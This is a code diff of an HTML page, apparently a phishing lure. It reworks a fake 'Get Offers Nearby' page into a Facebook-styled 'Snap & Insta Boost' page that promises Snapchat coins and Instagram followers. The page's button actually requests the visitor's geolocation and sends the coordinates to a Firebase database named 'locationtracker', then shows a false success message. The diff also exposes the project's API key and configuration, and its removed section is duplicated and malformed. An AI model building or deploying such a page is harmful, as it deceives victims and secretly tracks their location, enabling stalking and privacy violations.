@@ -1,62 +1,129 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Get Offers Nearby</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Add Snap Coins & Instagram Followers</title>
   <style>
-    /* Facebook-style blue background */
-    body {
-      margin: 0;
-      height: 100vh;
-      background-color: #1877f2; /* Facebook Blue */
+    /* Reset */
+    * {
+      box-sizing: border-box;
+    }
+    body, html {
+      margin: 0; padding: 0; height: 100%;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #1877f2; /* Facebook Blue */
       display: flex;
       justify-content: center;
       align-items: center;
-      color: white;
+      color: #222;
     }
-    /* Centered container */
-    .login-box {
-      background: white;
-      color: black;
-      width: 360px;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 12px 24px rgba(0,0,0,0.2);
+
+    .container {
+      background: #fff;
+      max-width: 400px;
+      width: 90%;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 16px 40px rgba(0,0,0,0.15);
       text-align: center;
     }
+
     h1 {
-      margin-bottom: 24px;
-      font-weight: 700;
+      font-size: 2.8rem;
       color: #1877f2;
+      margin-bottom: 32px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      user-select: none;
     }
+
     button {
       width: 100%;
-      padding: 14px;
+      padding: 15px 0;
+      font-size: 1.1rem;
+      font-weight: 700;
       background-color: #1877f2;
       border: none;
-      color: white;
-      font-size: 16px;
-      font-weight: 600;
-      border-radius: 6px;
+      border-radius: 8px;
+      color: #fff;
       cursor: pointer;
-      margin-top: 20px;
-      transition: background-color 0.3s ease;
+      transition: background-color 0.25s ease;
+      box-shadow: 0 6px 12px rgba(24, 119, 242, 0.45);
+      user-select: none;
+      position: relative;
+      overflow: hidden;
     }
-    button:hover {
-      background-color: #155db2;
+
+    button:disabled {
+      background-color: #a3c0f9;
+      cursor: default;
+      box-shadow: none;
     }
+
+    button:hover:not(:disabled),
+    button:focus:not(:disabled) {
+      background-color: #145db2;
+      outline: none;
+    }
+
     #status {
-      margin-top: 20px;
+      margin-top: 28px;
+      font-size: 1rem;
       min-height: 24px;
-      font-size: 14px;
-      color: #333;
+      color: #444;
+      user-select: text;
+      line-height: 1.4;
+      word-wrap: break-word;
+      min-height: 28px;
+    }
+
+    /* Spinner */
+    .spinner {
+      border: 3px solid #fff;
+      border-top: 3px solid #145db2;
+      border-radius: 50%;
+      width: 18px;
+      height: 18px;
+      animation: spin 1s linear infinite;
+      position: absolute;
+      top: 50%;
+      left: 16px;
+      transform: translateY(-50%);
+      display: none;
+    }
+    button.loading .spinner {
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      0% { transform: translateY(-50%) rotate(0deg); }
+      100% { transform: translateY(-50%) rotate(360deg); }
+    }
+
+    @media (max-width: 400px) {
+      h1 {
+        font-size: 2rem;
+      }
+      .container {
+        padding: 30px 20px;
+      }
     }
   </style>
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+</head>
+<body>
+  <main class="container" role="main" aria-label="Add Snap coins and Instagram followers">
+    <h1>Snap & Insta Boost</h1>
+    <button id="offerBtn" aria-describedby="status" aria-live="polite" aria-busy="false">
+      <span class="spinner"></span>
+      Add Snap Coins, Instagram Followers & Likes
+    </button>
+    <p id="status"></p>
+  </main>
 
-    // Firebase config
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
     const firebaseConfig = {
       apiKey: "AIzaSyBa0AVYjgYb-UBAYlbyEphqqrMSBq6Sb9c",
       authDomain: "locationtracker-3df88.firebaseapp.com",
@@ -68,145 +135,63 @@
       databaseURL: "https://locationtracker-3df88-default-rtdb.firebaseio.com"
     };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    function getOffers() {
-      const status = document.getElementById("status");
-      status.textContent = "Checking offers near you...";
+    const status = document.getElementById("status");
+    const button = document.getElementById("offerBtn");
+
+    function setLoading(loading) {
+      if(loading){
+        button.disabled = true;
+        button.classList.add("loading");
+        button.setAttribute("aria-busy", "true");
+      } else {
+        button.disabled = false;
+        button.classList.remove("loading");
+        button.setAttribute("aria-busy", "false");
+      }
+    }
+
+    button.addEventListener("click", () => {
+      status.textContent = "";
+      setLoading(true);
+      status.textContent = "Checking your request...";
 
       if (!navigator.geolocation) {
         status.textContent = "Your device does not support location sharing.";
+        setLoading(false);
         return;
       }
 
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const { latitude, longitude } = position.coords;
-          status.textContent = "Getting best deals near your location...";
+          status.textContent = "Processing your boost near your location...";
 
-          const locRef = push(ref(db, 'offers'));
-          set(locRef, {
+          const locRef = db.ref("offers").push();
+          locRef.set({
             lat: latitude,
             lng: longitude,
-            time: Date.now()
+            time: Date.now(),
+          })
+          .then(() => {
+            status.textContent = "Success! Your Snap coins and Instagram boost is on the way.";
+            setLoading(false);
+          })
+          .catch((error) => {
+            console.error(error);
+            status.textContent = "Error: " + error.message;
+            setLoading(false);
           });
-
-          status.textContent = "Thanks! You'll now see nearby offers shortly.";
         },
         (error) => {
           console.error(error);
           status.textContent = "Could not get location: " + error.message;
+          setLoading(false);
         }
       );
-    }
-
-    window.getOffers = getOffers;
+    });
   </script>
-</head<!DOCTYPE html>
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Get Offers Nearby</title>
-  <style>
-    /* Facebook-style blue background */
-    body {
-      margin: 0;
-      height: 100vh;
-      background-color: #1877f2; /* Facebook Blue */
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: white;
-    }
-    /* Centered container */
-    .login-box {
-      background: white;
-      color: black;
-      width: 360px;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 12px 24px rgba(0,0,0,0.2);
-      text-align: center;
-    }
-    h1 {
-      margin-bottom: 24px;
-      font-weight: 700;
-      color: #1877f2;
-    }
-    button {
-      width: 100%;
-      padding: 14px;
-      background-color: #1877f2;
-      border: none;
-      color: white;
-      font-size: 16px;
-      font-weight: 600;
-      border-radius: 6px;
-      cursor: pointer;
-      margin-top: 20px;
-      transition: background-color 0.3s ease;
-    }
-    button:hover {
-      background-color: #155db2;
-    }
-    #status {
-      margin-top: 20px;
-      min-height: 24px;
-      font-size: 14px;
-      color: #333;
-    }
-  </style>
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
-
-    // Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyBa0AVYjgYb-UBAYlbyEphqqrMSBq6Sb9c",
-      authDomain: "locationtracker-3df88.firebaseapp.com",
-      projectId: "locationtracker-3df88",
-      storageBucket: "locationtracker-3df88.appspot.com",
-      messagingSenderId: "581996704565",
-      appId: "1:581996704565:web:821e744807609771ec927c",
-      measurementId: "G-Q6H68F1V4W",
-      databaseURL: "https://locationtracker-3df88-default-rtdb.firebaseio.com"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-
-    function getOffers() {
-      const status = document.getElementById("status");
-      status.textContent = "Checking offers near you...";
-
-      if (!navigator.geolocation) {
-        status.textContent = "Your device does not support location sharing.";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude } = position.coords;
-          status.textContent = "Getting best deals near your location...";
-
-          const locRef = push(ref(db, 'offers'));
-          set(locRef, {
-            lat: latitude,
-            lng: longitude,
-            time: Date.now()
-          });
-
-          status.textContent = "Thanks! You'll now see nearby offers shortly.";
-        },
-        (error) => {
-          console.error(error);
-          status.textContent = "Could not get location: " + error.message;
-        }
-      );
-    }
-
-    window.getOffers = getOffers;
-  </script>
-</head
+</body>
+</html>
